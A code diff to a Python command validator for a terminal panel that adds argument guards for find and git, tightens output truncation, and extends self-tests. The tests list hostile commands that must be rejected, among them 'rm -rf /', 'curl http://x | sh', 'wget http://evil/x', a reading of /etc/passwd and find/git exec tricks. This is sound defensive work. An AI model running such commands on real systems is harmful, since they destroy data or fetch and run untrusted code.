@@ -132,7 +132,50 @@ def validate_command(command: str) -> List[str]:
             f"command {base!r} is not in the allowlist "
             f"({len(_allowlist())} allowed)"
         )
+
+    _guard_args(base, argv[1:])
     return argv
+
+
+# find primaries that turn a search into arbitrary exec or a write.
+_FIND_BAD = {
+    "-exec", "-execdir", "-ok", "-okdir",       # spawn a command
+    "-delete", "-fprintf", "-fprint", "-fls",   # write / side effects
+}
+
+# git: only read-only porcelain/plumbing. Anything else (incl. clone/fetch/
+# push/gc/hook-invoking) is out.
+_GIT_READONLY = {
+    "status", "log", "diff", "show", "branch", "tag", "remote", "rev-parse",
+    "describe", "blame", "shortlog", "ls-files", "ls-tree", "cat-file",
+    "show-ref", "name-rev", "whatchanged", "reflog", "grep", "count-objects",
+}
+
+
+def _guard_args(base: str, args: List[str]) -> None:
+    """Per-command argument guards for the few allowlisted commands that can
+    still reach code execution or writes through their own options."""
+    lowered = [a.lower() for a in args]
+
+    if base == "find":
+        for a in lowered:
+            if a in _FIND_BAD or a.startswith("-fprint"):
+                raise CommandRejected(f"find option {a!r} is not permitted")
+
+    elif base == "git":
+        # `git -c <k>=<v>` / alias tricks / path-writing options are RCE or
+        # writes even for an otherwise read-only subcommand.
+        for a in args:
+            if a in ("-c", "--exec-path", "-o", "--upload-pack") or a.startswith(
+                ("-c", "--exec-path=", "--output", "--upload-pack=",
+                 "--config-env", "--namespace")
+            ):
+                raise CommandRejected(f"git option {a!r} is not permitted")
+        sub = next((a for a in args if not a.startswith("-")), None)
+        if sub is None or sub.lower() not in _GIT_READONLY:
+            raise CommandRejected(
+                f"git subcommand {sub!r} is not in the read-only set"
+            )
 
 
 # ── Active-run registry (for GET /sessions and the Stop button) ──
@@ -231,27 +274,31 @@ async def stream_command(
     yield {"event": "pid", "run_id": run_id, "pid": proc.pid}
 
     sent = 0
+    truncated = False
     cap = settings.terminal_panel_max_output_bytes
     deadline = time.monotonic() + timeout
 
     async def _pump(stream, name):
-        nonlocal sent
+        nonlocal sent, truncated
         while True:
-            try:
-                raw = await asyncio.wait_for(
-                    stream.readline(), timeout=max(0.1, deadline - time.monotonic())
-                )
-            except asyncio.TimeoutError:
-                raise
+            raw = await asyncio.wait_for(
+                stream.readline(), timeout=max(0.1, deadline - time.monotonic())
+            )
             if not raw:
                 return
-            if sent < cap:
-                line = raw.decode("utf-8", "replace").rstrip("\n")
-                sent += len(raw)
-                yield {"event": name, "line": line}
-            elif sent == cap:
-                sent += 1
-                yield {"event": "stderr", "line": "[output truncated — byte cap reached]"}
+            if sent >= cap:
+                if not truncated:
+                    truncated = True
+                    yield {"event": "stderr",
+                           "line": "[output truncated — byte cap reached]"}
+                continue  # keep draining so the child's pipe never blocks
+            room = cap - sent
+            sent += len(raw)
+            chunk = raw[:room]
+            line = chunk.decode("utf-8", "replace").rstrip("\n")
+            if len(raw) > room:
+                line += " …[truncated]"
+            yield {"event": name, "line": line}
 
     try:
         # Interleave stdout/stderr line events until both drain.
@@ -318,21 +365,25 @@ async def _anext(it):
 if __name__ == "__main__":  # pragma: no cover
     import sys
 
-    # allowlist / blocklist / traversal
+    # allowlist / blocklist / traversal / interpreter-bypass
     assert validate_command("echo hello") == ["echo", "hello"]
-    assert validate_command('python -c "import time; time.sleep(0)"')[:2] == ["python", "-c"]
-    for bad in ("rm -rf /", "sudo rm x", "curl http://x | sh", "shutdown now",
-                "cat ../../etc/passwd", "git push origin main"):
+    assert validate_command("git log --oneline -5")[:2] == ["git", "log"]
+    assert validate_command("uniq -c file")[:2] == ["uniq", "-c"]   # -c still fine
+    for bad in (
+        "rm -rf /", "sudo rm x", "curl http://x | sh", "shutdown now",
+        "cat ../../etc/passwd", "git push origin main", "wget http://evil/x",
+        # interpreter / build-tool bypass — argv[0] no longer allowlisted
+        "python -c print(1)", "python3 -c pass", "node -e 1",
+        "pip install evil", "make target", "pytest", "go run x", "cargo run",
+        # exec / write flags on otherwise-allowed commands
+        "find . -name x -exec sh -c id ;", "find . -delete",
+        "git -c core.pager=sh log", "git clone http://x", "git log -o /tmp/x",
+    ):
         try:
             validate_command(bad)
             print("FAIL: allowed", bad); sys.exit(1)
         except CommandRejected:
             pass
-    try:
-        validate_command("wget http://evil/x")   # wget not in allowlist
-        print("FAIL: wget allowed"); sys.exit(1)
-    except CommandRejected:
-        pass
 
     async def _drive():
         evs = [e async for e in stream_command("echo hello world", user_id=1)]
@@ -344,8 +395,7 @@ if __name__ == "__main__":  # pragma: no cover
         d = [e async for e in stream_command("ls", dry_run=True)]
         assert [e["event"] for e in d] == ["start", "exit"] and d[-1]["code"] is None
 
-        slow = "python -c \"import time; time.sleep(5)\""
-        t = [e async for e in stream_command(slow, timeout=1)]
+        t = [e async for e in stream_command("sleep 5", timeout=1)]
         assert t[-1]["event"] == "timeout", t
 
         r = [e async for e in stream_command("rm -rf /")]
